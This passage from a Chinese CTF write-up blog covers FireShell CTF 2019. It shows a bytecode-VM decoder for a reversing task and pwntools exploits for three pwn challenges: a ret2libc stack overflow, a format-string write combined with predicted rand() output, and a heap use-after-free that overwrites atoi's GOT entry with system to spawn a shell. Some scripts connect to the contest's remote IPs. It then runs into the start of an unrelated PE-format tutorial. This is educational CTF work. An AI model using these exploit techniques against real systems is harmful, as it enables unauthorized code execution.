0x00000006, 0x00000000, 0x00005820, 0x00000000, 0x00000053, 0x00000001, 0x00000000, 0x00005873, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x0000B0E6, 0x00000000, 0x00000063, 0x00000006, 0x00000000, 0x0000B0E6, 0x00000000, 0x0000B074, 0x00000006, 0x00000002, 0x00000000, 0x0000B0E6, 0x00000000, 0x0000B0E6, 0x00000006, 0x00000000, 0x00000033, 0x00000000, 0x0000004A, 0x00000001, 0x00000000, 0x0000007D, 0x00000000, 0x0000001B, 0x00000006, 0x00000000, 0x0000007D, 0x00000000, 0x00000001, 0x00000006, 0x00000000, 0x0000007D, 0x00000000, 0x0000001D, 0x00000001, 0x00000000, 0x0000009A, 0x00000000, 0x00000052, 0x00000001, 0x00000000, 0x000000EC, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x000000EC, 0x00000000, 0x0000001D, 0x00000001, 0x00000000, 0x00000109, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00000848, 0x00000000, 0x00000022, 0x00000001, 0x00000000, 0x0000086A, 0x00000000, 0x00000025, 0x00000001, 0x00000000, 0x0000088F, 0x00000000, 0x00000009, 0x00000001, 0x00000000, 0x00000898, 0x00000000, 0x00000024, 0x00000006, 0x00000000, 0x00000898, 0x00000000, 0x0000005F, 0x00000001, 0x00000000, 0x000008F7, 0x00000000, 0x000008C4, 0x00000006, 0x00000002, 0x00000000, 0x000008F7, 0x00000000, 0x000008F7, 0x00000006, 0x00000000, 0x00000061, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000002A7, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x00000FEA, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x00002FBE, 0x00000000, 0x0000003C, 0x00000001, 0x00000000, 0x00002FFA, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x00014FD6, 0x00000000, 0x00000015, 0x00000001, 0x00000000, 0x00014FEB, 0x00000000, 0x00000062, 0x00000006, 0x00000000, 0x00014FEB, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x00053FAC, 0x00000000, 0x00000016, 0x00000006, 0x00000000, 0x00053FAC, 0x00000000, 0x0000005C, 0x00000006, 0x00000000, 0x00053FAC, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x002F3D0C, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00EC313C, 0x00000000, 0x00000015, 0x00000006, 0x00000000, 0x00EC313C, 0x00000000, 0x00000041, 0x00000001, 0x00000000, 0x00EC317D, 0x00000000, 0x00000004, 0x00000006, 0x00000000, 0x00EC317D, 0x00000000, 0x0000002A, 0x00000006, 0x00000000, 0x00EC317D, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x0939EEE2, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x530965F2, 0x00000000, 0x53096591, 0x00000006, 0x00000002, 0x00000000, 0x530965F2, 0x00000000, 0x530965F2, 0x00000006, 0x00000000, 0x0000006C, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x000001B0, 0x00000000, 0x00000034, 0x00000001, 0x00000000, 0x000001E4, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x00001104, 0x00000000, 0x0000001E, 0x00000001, 0x00000000, 0x00001122, 0x00000000, 0x00000005, 0x00000001, 0x00000000, 0x00001127, 0x00000000, 0x00000061, 0x00000006, 0x00000000, 0x00001127, 0x00000000, 0x0000005F, 0x00000006, 0x00000000, 0x00001127, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x00007811, 0x00000000, 0x00000030, 0x00000006, 0x00000000, 0x00007811, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x00007811, 0x00000000, 0x00000008, 0x00000001, 0x00000000, 0x00007819, 0x00000000, 0x00000025, 0x00000006, 0x00000000, 0x00007819, 0x00000000, 0x00000036, 0x00000006, 0x00000000, 0x00007819, 0x00000000, 0x0000002F, 0x00000001, 0x00000000, 0x00007848, 0x00000000, 0x0000000E, 0x00000001, 0x00000000, 0x00007856, 0x00000000, 0x00000053, 0x00000001, 0x00000000, 0x000078A9, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00025B4D, 0x00000000, 0x00000005, 0x00000006, 0x00000000, 0x00025B4D, 0x00000000, 0x00025AE1, 0x00000006, 0x00000002, 0x00000000, 0x00025B4D, 0x00000000, 0x00025B4D, 0x00000006, 0x00000000, 0x0000006C, 0x00000000, 0x00000036, 0x00000006, 0x00000000, 0x0000006C, 0x00000000, 0x00000037, 0x00000006, 0x00000000, 0x0000006C, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000002F4, 0x00000000, 0x0000000D, 0x00000006, 0x00000000, 0x000002F4, 0x00000000, 0x00000039, 0x00000006, 0x00000000, 0x000002F4, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00000EC4, 0x00000000, 0x00000059, 0x00000006, 0x00000000, 0x00000EC4, 0x00000000, 0x00000036, 0x00000001, 0x00000000, 0x00000EFA, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x00000EFA, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x000077D0, 0x00000000, 0x00000055, 0x00000006, 0x00000000, 0x000077D0, 0x00000000, 0x00000060, 0x00000006, 0x00000000, 0x000077D0, 0x00000000, 0x00000035, 0x00000001, 0x00000000, 0x00007805, 0x00000000, 0x00007799, 0x00000006, 0x00000002, 0x00000000, 0x00007805, 0x00000000, 0x00007805, 0x00000006, 0x00000000, 0x00000079, 0x00000000, 0x00000039, 0x00000006, 0x00000000, 0x00000079, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x00000079, 0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x0000007A, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x000002DC, 0x00000000, 0x00000051, 0x00000006, 0x00000000, 0x000002DC, 0x00000000, 0x00000022, 0x00000001, 0x00000000, 0x000002FE, 0x00000000, 0x0000000D, 0x00000001, 0x00000000, 0x0000030B, 0x00000000, 0x00000052, 0x00000001, 0x00000000, 0x0000035D, 0x00000000, 0x00000007, 0x00000006, 0x00000000, 0x0000035D, 0x00000000, 0x00000021, 0x00000006, 0x00000000, 0x0000035D, 0x00000000, 0x00000063, 0x00000001, 0x00000000, 0x000003C0, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x000021C0, 0x00000000, 0x0000002B, 0x00000006, 0x00000000, 0x000021C0, 0x00000000, 0x00002147, 0x00000006, 0x00000002, 0x00000000, 0x000021C0, 0x00000000, 0x000021C0, 0x00000006, 0x00000000, 0x0000005F, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x0000011D, 0x00000000, 0x00000020, 0x00000006, 0x00000000, 0x0000011D, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x00000474, 0x00000000, 0x00000030, 0x00000006, 0x00000000, 0x00000474, 0x00000000, 0x00000024, 0x00000001, 0x00000000, 0x00000498, 0x00000000, 0x0000002D, 0x00000006, 0x00000000, 0x00000498, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x000016F8, 0x00000000, 0x00000007, 0x00000001, 0x00000000, 0x000016FF, 0x00000000, 0x00000058, 0x00000006, 0x00000000, 0x000016FF, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x0000A0F9, 0x00000000, 0x00000030, 0x00000001, 0x00000000, 0x0000A129, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x0004681F, 0x00000000, 0x00000049, 0x00000006, 0x00000000, 0x0004681F, 0x00000000, 0x00000044, 0x00000001, 0x00000000, 0x00046863, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x0027AB7B, 0x00000000, 0x00000009, 0x00000006, 0x00000000, 0x0027AB7B, 0x00000000, 0x00000055, 0x00000006, 0x00000000, 0x0027AB7B, 0x00000000, 0x0027AB1C, 0x00000006, 0x00000002, 0x00000000, 0x0027AB7B, 0x00000000, 0x0027AB7B, 0x00000006, 0x00000000, 0x00000063, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x00000252, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x00000DEC, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x00006174, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x000185D0, 0x00000000, 0x0000003C, 0x00000001, 0x00000000, 0x0001860C, 0x00000000, 0x00000063, 0x00000006, 0x00000000, 0x0001860C, 0x00000000, 0x0000001A, 0x00000001, 0x00000000, 0x00018626, 0x00000000, 0x00000064, 0x00000001, 0x00000000, 0x0001868A, 0x00000000, 0x00000057, 0x00000006, 0x00000000, 0x0001868A, 0x00000000, 0x0000005D, 0x00000006, 0x00000000, 0x0001868A, 0x00000000, 0x0000005C, 0x00000006, 0x00000000, 0x0001868A, 0x00000000, 0x00018627, 0x00000006, 0x00000002, 0x00000000, 0x0001868A, 0x00000000, 0x0001868A, 0x00000006, 0x00000000, 0x00000030, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x00000030, 0x00000000, 0x00000005, 0x00000006, 0x00000000, 0x00000030, 0x00000000, 0x00000009, 0x00000001, 0x00000000, 0x00000039, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x00000039, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00000072, 0x00000000, 0x0000004E, 0x00000006, 0x00000000, 0x00000072, 0x00000000, 0x0000002D, 0x00000001, 0x00000000, 0x0000009F, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x0000013E, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x000003BA, 0x00000000, 0x00000029, 0x00000001, 0x00000000, 0x000003E3, 0x00000000, 0x000003B3, 0x00000006, 0x00000002, 0x00000000, 0x000003E3, 0x00000000, 0x000003E3, 0x00000006, 0x00000000, 0x00000030, 0x00000000, 0x0000003E, 0x00000006, 0x00000000, 0x00000030, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00000180, 0x00000000, 0x0000001A, 0x00000001, 0x00000000, 0x0000019A, 0x00000000, 0x0000000F, 0x00000001, 0x00000000, 0x000001A9, 0x00000000, 0x0000003A, 0x00000001, 0x00000000, 0x000001E3, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x000010FB, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x000010FB, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x000043EC, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00021F60, 0x00000000, 0x00000009, 0x00000001, 0x00000000, 0x00021F69, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00043ED2, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x0021F690, 0x00000000, 0x00000013, 0x00000006, 0x00000000, 0x0021F690, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x0021F690, 0x00000000, 0x0021F660, 0x00000006, 0x00000002, 0x00000000, 0x0021F690, 0x00000000, 0x0021F690, 0x00000006, 0x00000000, 0x0000006C, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x000003CC, 0x00000000, 0x00000025, 0x00000006, 0x00000000, 0x000003CC, 0x00000000, 0x0000005C, 0x00000006, 0x00000000, 0x000003CC, 0x00000000, 0x00000033, 0x00000006, 0x00000000, 0x000003CC, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x00000B64, 0x00000000, 0x00000062, 0x00000006, 0x00000000, 0x00000B64, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x000071E8, 0x00000000, 0x00000023, 0x00000006, 0x00000000, 0x000071E8, 0x00000000, 0x00000033, 0x00000001, 0x00000000, 0x0000721B, 0x00000000, 0x00000054, 0x00000001, 0x00000000, 0x0000726F, 0x00000000, 0x0000004A, 0x00000001, 0x00000000, 0x000072B9, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00023D9D, 0x00000000, 0x00000002, 0x00000006, 0x00000000, 0x00023D9D, 0x00000000, 0x00000015, 0x00000006, 0x00000000, 0x00023D9D, 0x00000000, 0x00000053, 0x00000001, 0x00000000, 0x00023DF0, 0x00000000, 0x00000004, 0x00000001, 0x00000000, 0x00023DF4, 0x00000000, 0x00023D88, 0x00000006, 0x00000002, 0x00000000, 0x00023DF4, 0x00000000, 0x00023DF4, 0x00000006, 0x00000000, 0x00000021, 0x00000000, 0x00000044, 0x00000006, 0x00000000, 0x00000021, 0x00000000, 0x0000005D, 0x00000001, 0x00000000, 0x0000007E, 0x00000000, 0x00000043, 0x00000006, 0x00000000, 0x0000007E, 0x00000000, 0x00000042, 0x00000006, 0x00000000, 0x0000007E, 0x00000000, 0x00000049, 0x00000001, 0x00000000, 0x000000C7, 0x00000000, 0x0000002C, 0x00000006, 0x00000000, 0x000000C7, 0x00000000, 0x00000038, 0x00000001, 0x00000000, 0x000000FF, 0x00000000, 0x00000029, 0x00000001, 0x00000000, 0x00000128, 0x00000000, 0x00000006, 0x00000001, 0x00000000, 0x0000012E, 0x00000000, 0x00000008, 0x00000001, 0x00000000, 0x00000136, 0x00000000, 0x00000115, 0x00000006, 0x00000002, 0x00000000, 0x00000136, 0x00000000, 0x00000136, 0x00000006, 0x00000000, 0x0000007D, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x000002EE, 0x00000000, 0x0000002E, 0x00000006, 0x00000000, 0x000002EE, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x00000BB8, 0x00000000, 0x00000033, 0x00000006, 0x00000000, 0x00000BB8, 0x00000000, 0x00000014, 0x00000001, 0x00000000, 0x00000BCC, 0x00000000, 0x0000000E, 0x00000006, 0x00000000, 0x00000BCC, 0x00000000, 0x00000035, 0x00000006, 0x00000000, 0x00000BCC, 0x00000000, 0x0000001A, 0x00000001, 0x00000000, 0x00000BE6, 0x00000000, 0x00000058, 0x00000006, 0x00000000, 0x00000BE6, 0x00000000, 0x00000046, 0x00000006, 0x00000000, 0x00000BE6, 0x00000000, 0x00000042, 0x00000001, 0x00000000, 0x00000C28, 0x00000000, 0x0000000F, 0x00000006, 0x00000000, 0x00000C28, 0x00000000, 0x00000022, 0x00000001, 0x00000000, 0x00000C4A, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00003D72, 0x00000000, 0x00000053, 0x00000006, 0x00000000, 0x00003D72, 0x00000000, 0x0000000B, 0x00000001, 0x00000000, 0x00003D7D, 0x00000000, 0x0000005D, 0x00000006, 0x00000000, 0x00003D7D, 0x00000000, 0x0000005F, 0x00000006, 0x00000000, 0x00003D7D, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x00022965, 0x00000000, 0x000228E8, 0x00000006, 0x00000002, 0x00000000, 0x00022965, 0x00000000, 0x00022965, 0x00000006, 0x00000003, 0x00000000]i = -1j = 0buf = [0 for k in range(530)]tmp = 0count = 1flag = ''while(True): if i - 1 != tmp and buf[i - 1] == 0: flag += chr(buf[i]) tmp = i - 1 c = code[j] if c == 0: i += 1 j += 1 buf[i] = code[j] elif c == 1: i -= 1 buf[i] += buf[i + 1] elif c == 3: print 'Over' break elif c == 4: i -= 1 buf[i] *= buf[i + 1] elif c == 5: i -= 1 buf[i] /= buf[i + 1] elif c == 6: i -= 1 buf[i] -= buf[i + 1] elif c == 2: j += 1 continue else: print 'Error' break print 'buf[&#123;&#125;] = &#123;&#125;'.format(str(i), hex(buf[i])) j += 1print flag 同时在 buf 的值中发现buf[0] = 0x46 = &#39;F&#39; ; buf[11] = 0, buf[12] = 0x23 = &#39;#&#39; ; ...，猜测每次输出为buf[i] = 0的后一个值即buf[i + 1]为 flag 的值。对脚本稍作修改后得到 flag。 PWNleakless简单栈溢出。 1234567[leakless] checksec leakless[*] '/root/ctf/2019-FireShell/leakless/leakless' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 没开 canary 和 pie。可以看到溢出漏洞在这里： 123456ssize_t feedme()&#123; char buf; // [esp+0h] [ebp-48h] return read(0, &amp;buf, 0x100u);&#125; 第一次先泄露出 puts 的地址，然后找到 libc 的版本，return 回feedme()函数。第二次直接跳 system。exp 如下： 12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import *context.log_level = 'debug'context.arch = 'i386'p = remote('35.243.188.20', 2002)elf = ELF('./leakless')offset = 76feedme = elf.symbols['feedme']puts_plt = elf.plt['puts']puts_got = elf.got['puts']log.success('feedme = ' + hex(feedme))log.success('puts_plt = ' + hex(puts_plt))log.success('puts_got = ' + hex(puts_got))payload1 = flat([ 'A' * offset, puts_plt, feedme, puts_got])p.sendline(payload1)puts = u32(p.recv(4))log.success('puts = ' + hex(puts))libc = LibcSearcher('puts', puts)libc_base = puts - libc.dump('puts')system = libc_base + libc.dump('system')str_bin_sh = libc_base + libc.dump('str_bin_sh')log.success('libc_base = ' + hex(libc_base))log.success('system = ' + hex(system))log.success('str_bin_sh = ' + hex(str_bin_sh))payload2 = flat([ 'A' * offset, system, 0x12345678, str_bin_sh])p.interactive() casino除了 pie 其他保护都开了： 1234567[casino] checksec casino 11:02:20[*] '/root/ctf/2019-FireShell/casino/casino' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 在 ida 里查看 main 函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// local variable allocation has failed, the output may be wrong!int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+4h] [rbp-5Ch] int v5; // [rsp+8h] [rbp-58h] unsigned int i; // [rsp+Ch] [rbp-54h] unsigned int seed; // [rsp+10h] [rbp-50h] int v8; // [rsp+14h] [rbp-4Ch] FILE *stream; // [rsp+18h] [rbp-48h] char buf; // [rsp+20h] [rbp-40h] char ptr; // [rsp+30h] [rbp-30h] unsigned __int64 v12; // [rsp+58h] [rbp-8h] v12 = __readfsqword(0x28u); setup(*(_QWORD *)&amp;argc, argv, envp); seed = (unsigned int)time(0LL) / 0xA; printf(\"What is your name? \"); read(0, &amp;buf, 0x10uLL); printf(\"Welcome \", &amp;buf); printf(&amp;buf); putchar(10); seed += bet; srand(seed); v4 = 0; v5 = 0; for ( i = 1; (signed int)i &lt;= 99; ++i ) &#123; v8 = rand(); printf(\"[%d/100] Guess my number: \", i); __isoc99_scanf(\"%d\", &amp;v4); if ( v8 != v4 ) &#123; puts(\"Sorry! It was not my number\"); exit(0); &#125; puts(\"Correct!\"); v5 += bet; &#125; if ( v5 &gt; 100 ) &#123; puts(\"Cool! Here's another prize\"); stream = fopen(\"flag.txt\", \"r\"); fread(&amp;ptr, 0x1EuLL, 1uLL, stream); fclose(stream); printf(\"%s\", &amp;ptr); &#125; return 0;&#125; 需要猜 99 次随机数，然后使得由bet累加起来大于 100 即得到 flag。首先要过前面的猜数字，照样子写一个 c 程序即可： 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;time.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main() &#123; int seed = time(0) / 0xA; int bet = 2; // 1; seed += bet; srand(seed); for (int i = 0; i &lt; 99; i++) &#123; int a = rand(); printf(\"%d\\n\", a); &#125; return 0;&#125; 先编译，gcc solve.c -o solve；再 pipe 一下，(echo &#39;test&#39;; ./solve) | ./casino。得到结果是： 123[1/100] Guess my number: Correct!...[99/100] Guess my number: Correct! 说明猜数字过了，而 bet 累加起来只有 99，没有超过 100。此时回忆之前的代码，printf(&quot;Welcome &quot;, &amp;buf);存在格式化字符串漏洞，我们只需要通过这个漏洞，将bet的值改写即可。通过 gdb 调试得到bet的地址： 123456789[-------------------------------------code-------------------------------------] 0x400ac3 &lt;main+132&gt;: call 0x400840 &lt;printf@plt&gt; 0x400ac8 &lt;main+137&gt;: mov edi,0xa 0x400acd &lt;main+142&gt;: call 0x4007f0 &lt;putchar@plt&gt;=&gt; 0x400ad2 &lt;main+147&gt;: mov eax,DWORD PTR [rip+0x201548] # 0x602020 &lt;bet&gt; 0x400ad8 &lt;main+153&gt;: add DWORD PTR [rbp-0x50],eax 0x400adb &lt;main+156&gt;: mov eax,DWORD PTR [rbp-0x50] 0x400ade &lt;main+159&gt;: mov edi,eax 0x400ae0 &lt;main+161&gt;: call 0x400870 &lt;srand@plt&gt; 确定第一个参数在栈上的偏移为 11： 1234567891011[casino] python -c 'print \"%2c%11$n\" + \"\\x20\\x20\\x60\\x00\\x00\\x00\\x00\\x00\"' &gt; input 20:06:05[casino] gdb ./casino -q 20:06:11Reading symbols from ./casino...(no debugging symbols found)...done.assassinq&gt;&gt; b *main+137Breakpoint 1 at 0x400ac8assassinq&gt;&gt; r &lt; inputStarting program: /root/ctf/2019-FireShell/casino/casino &lt; inputWhat is your name? Welcome ? `Breakpoint 1, 0x0000000000400ac8 in main ()assassinq&gt;&gt; x/wx 0x6020200x602020 &lt;bet&gt;: 0x00000002 我把 bet 的值改为 2。最后的 exp 如下： 12345678910111213141516171819202122#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'context.arch = 'amd64'local = 1if local: p = process('./casino')else: passbet_addr = 0x0000000000602020bet = 2offset = 11fmt = '%&#123;&#125;c%&#123;&#125;$n'payload = flat([fmt.format(str(bet), str(offset)), bet_addr])p.sendlineafter('name?', payload)s = process('./solve')nums = s.recvall().split('\\n')[:-1]s.close()for n in nums: p.sendlineafter('number:', n)print p.recvall()p.close() babyheap1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; unsigned int c; // eax char s; // [rsp+10h] [rbp-10h] unsigned __int64 v5; // [rsp+18h] [rbp-8h] v5 = __readfsqword(0x28u); init_buf(); while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; welcome(); printf(\"&gt; \", a2); memset(&amp;s, 0, 8uLL); a2 = (char **)&amp;s; read(0, &amp;s, 8uLL); c = atoi(&amp;s); if ( c != 3 ) break; if ( show_flag == 1 ) &#123; puts(\"Again? Oh no, you can't\"); exit(0); &#125; show(); &#125; if ( c &gt; 3 ) break; if ( c == 1 ) &#123; if ( create_flag == 1 ) &#123; puts(\"Again? Oh no, you can't\"); exit(0); &#125; create(); &#125; else &#123; if ( c != 2 ) goto LABEL_33; if ( edit_flag == 1 ) &#123; puts(\"Again? Oh no, you can't\"); exit(0); &#125; edit(); &#125; &#125; if ( c == 5 ) &#123; puts(\"Bye!\"); exit(0); &#125; if ( c &lt; 5 ) &#123; if ( delete_flag == 1 ) &#123; puts(\"Again? Oh no, you can't\"); exit(0); &#125; delete(); &#125; else &#123; if ( c != 1337 ) &#123;LABEL_33: puts(\"Invalid option\"); exit(0); &#125; if ( secret_flag == 1 ) &#123; puts(\"Again? Oh no, you can't\"); exit(0); &#125; secret(); &#125; &#125;&#125; 菜单题，对操作次数有限制，create两次次，delete、edit、show各一次。还有一个隐藏选项secret可以同时create和edit。在delete中发现并没有给指针置零，很明显的可以 uaf。在 ida 中可以看到 bss 上变量的分布： 1234567891011121314.bss:00000000006020A0 create_flag dq ? ; DATA XREF: create+21↑w.bss:00000000006020A0 ; delete+1F↑w ....bss:00000000006020A8 edit_flag dq ? ; DATA XREF: edit+2E↑w.bss:00000000006020A8 ; main:loc_400AC1↑r.bss:00000000006020B0 show_flag dq ? ; DATA XREF: show+1F↑w.bss:00000000006020B0 ; main:loc_400AF3↑r.bss:00000000006020B8 delete_flag dq ? ; DATA XREF: delete+2A↑w.bss:00000000006020B8 ; main:loc_400B25↑r.bss:00000000006020C0 secret_flag dq ? ; DATA XREF: secret+3F↑r.bss:00000000006020C0 ; secret+4A↑w ....bss:00000000006020C8 ; void *buf.bss:00000000006020C8 buf dq ? ; DATA XREF: create+E↑w.bss:00000000006020C8 ; edit+15↑r ....bss:00000000006020C8 _bss ends 利用 uaf 将 chunk 移到 bss 上，可以把所有的选项置零，同时把 buf 改成某个地址，可以做到任意地址写。这里用atoi的 got，可以用show泄漏 libc 地址，然后将/bin/sh作为参数传入atoi，最后执行system(&quot;/bin/sh&quot;);。exploit： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'context.terminal = ['tmux', 'sp', '-h']local = 1if local: p = process('./babyheap', env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;)else: p = remote('51.68.189.144', 31005)elf = ELF('./babyheap')libc = ELF('./libc.so.6')atoi_got = elf.got['atoi']info('atoi_got = ' + hex(atoi_got))buf = 0x006020A0gdb.attach(p)def create(): p.sendafter('&gt; ', '1')def edit(data): p.sendafter('&gt; ', '2') p.sendafter('Content? ', data)def show(): p.sendafter('&gt; ', '3')def delete(): p.sendafter('&gt; ', '4')def fill(data): p.sendafter('&gt; ', '1337') p.sendafter('Fill ', data)create()delete()edit(p64(buf))create()payload = '\\x00' * 0x28 + p64(atoi_got)fill(payload)show()atoi = u64(p.recvuntil('\\x7f')[-6:].ljust(8, '\\x00'))libc_base = atoi - libc.symbols['atoi']success('libc_base = ' + hex(libc_base))system = libc_base + libc.symbols['system']edit(p64(system))p.sendafter('&gt; ', '/bin/sh')p.interactive() 参考网站https://cute-0tter.hatenablog.com/entry/2019/01/28/153836https://mp.weixin.qq.com/s/T5APY4HJnw7rM3nvxDi8NAhttps://mp.weixin.qq.com/s/LzyKtwmqq5HO6meUqq7aughttps://github.com/D4nch3n/Cyber-Competitions/blob/master/fireshellctf/README.mdhttps://github.com/flawwan/CTF-Writeups/blob/master/Fireshell/casino/casino.mdhttps://github.com/happysox/CTF_Writeups/tree/master/Fireshell_CTF_2019/babyheap","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"blog.b3ale.cn/tags/wp/"}]},{"title":"RE入门（三）","slug":"RE入门（三）","date":"2019-01-28T05:03:31.000Z","updated":"2019-11-07T01:51:02.119Z","comments":true,"path":"2019/01/28/RE入门（三）/","link":"","permalink":"blog.b3ale.cn/2019/01/28/RE入门（三）/","excerpt":"摘自《逆向工程核心原理》中关于 Windows 操作系统的 PE（Portable Executable）文件格式的部分，其中也有关于进程、内存、DLL 等的内容，它们是 Windows 操作系统中最核心的部分。","text":"摘自《逆向工程核心原理》中关于 Windows 操作系统的 PE（Portable Executable）文件格式的部分，其中也有关于进程、内存、DLL 等的内容，它们是 Windows 操作系统中最核心的部分。 PE 文件格式介绍PE 文件是 Windows 操作系统下使用的可执行文件格式。它是微软在 UNIX 平台的 COFF（Common Object File Format，通用对象文件格式）基础上制作而成的。最初（正如 Portable 这个单词所代表的那样）设计用来提高程序在不同操作系统上的移植性，但实际上这种文件格式仅用在 Windows 系列的操作系统下。 PE 文件是指 32 位的可执行文件，也称为 PE32。64 位的可执行文件成为 PE+ 或 PE32+，是 PE（PE32）文件的一种扩展形式（请注意不是 PE64）。 PE 文件格式PE 文件种类如表所示。 种类 主扩展名 可执行系列 EXE、SCR 库系列 DLL、OCX、CPL、DRV 驱动程序系列 SYS、VXD 对象文件系列 OBJ 严格地说，OBJ（对象）文件之外的所有文件都是可执行的。DLL、SYS 文件等虽然不能直接在 Shell（Explorer.exe）中运行，但可以使用其他方式（调试器、服务等）执行。 根据 PE 正式规范，编译结果 OBJ 文件也视为 PE 文件。但是 OBJ 文件本身不能以任何形式执行，在代码逆向分析中几乎不需要关注它。 接下来以记事本（Windows XP SP3 的 notepad.exe，与其他版本 Windows 下的 notepad.exe 文件结构类似，但是地址不同）程序进行简单说明。 下面是 notepad.exe 文件的起始部分，也是 PE 文件的头部分（PE header）。notepad.exe 文件运行需要的所有信息就存储在这个 PE 头中。如果加载到内存、从何处开始运行、运行中需要的 DLL 有哪些、需要多大的栈/堆内存等，大量信息以结构体形式存储在 PE 头中。换言之，学习 PE 文件格式就是学习 PE 头中的结构体。 基本结构notepad.exe 具有普通 PE 文件的基本结构。从 DOS 头（DOS header）到节区头（Section header）是 PE 头部分，其下的节区合称 PE 体。文件中使用偏移（offset），内存中使用 VA（Virtual Address，虚拟地址）来表示位置。文件加载到内存时，情况就会发生变化（节区的大小、位置等）。文件的内容一般可分为代码（.text）、数据（.data）、资源（.rsrc）节，分别保存。 根据所用的不同开发工具（VB/VC++/Delphi/etc）与编译选项，节区的名称、大小、个数、存储的内容等都是不同的。最重要的是它们按照不同的用途分类保存到不同的节中。 各节区头定义了各节区在文件或内存中的大小、位置、属性等。 PE 头与各节区的尾部存在一个区域，称为 NULL 填充（Null padding）。计算机中，为了提高处理文件、内存、网络包的效率，使用“最小基本单位”这一概念，PE 文件中也类似。文件/内存中节区的起始位置应该在各文件/内存最小单位的倍数位置上，空白区域将用 NULL 填充（可以看到各节区起始地址的截断都遵循一定的规则）。 VA&amp;RVAVA 指的是进程虚拟内存的绝对地址，RVA（Relative Virtual Address，相对虚拟地址）指从某个基准位置（ImageBase）开始的相对地址。VA 和 RVA 满足下面的换算关系。 1RVA+ImageBase=RA PE 头内部信息大多以 RVA 形式存在。原因在于，PE 文件（主要是 DLL）加载到进程虚拟内存的特定位置时，该位置可能已经加载了其他 PE 文件（DLL）。此时必须通过重定位（Relocation）将其加载到其他空白的位置，若 PE 头信息使用的是 VA，则无法正常访问。因此使用 RVA 来定位信息，即使发生了重定位，只要相对于基准位置的相对地址没有变化，就能正常访问到指定信息，不会出现任何问题。 32 位 Windows OS 中，各进程分配有 4GB 的虚拟内存，因此进程中 VA 值的范围是 00000000~FFFFFFFF。 PE 头PE 头由许多结构体组成。 DOS 头微软创建 PE 文件格式时，人们正广泛使用 DOS 文件，所以微软充分考虑了 PE 文件对 DOS 文件的兼容性。其结果是在 PE 头的最前面添加了一个 IMAGE_DOS_HEADER 结构体，用来扩展已有的 DOS EXE 头。 123456789101112131415161718192021typedef struct 